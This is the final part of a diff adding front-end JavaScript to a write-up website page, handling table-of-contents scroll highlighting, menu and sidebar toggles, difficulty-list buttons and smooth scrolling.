+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    
+                    sherlockList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
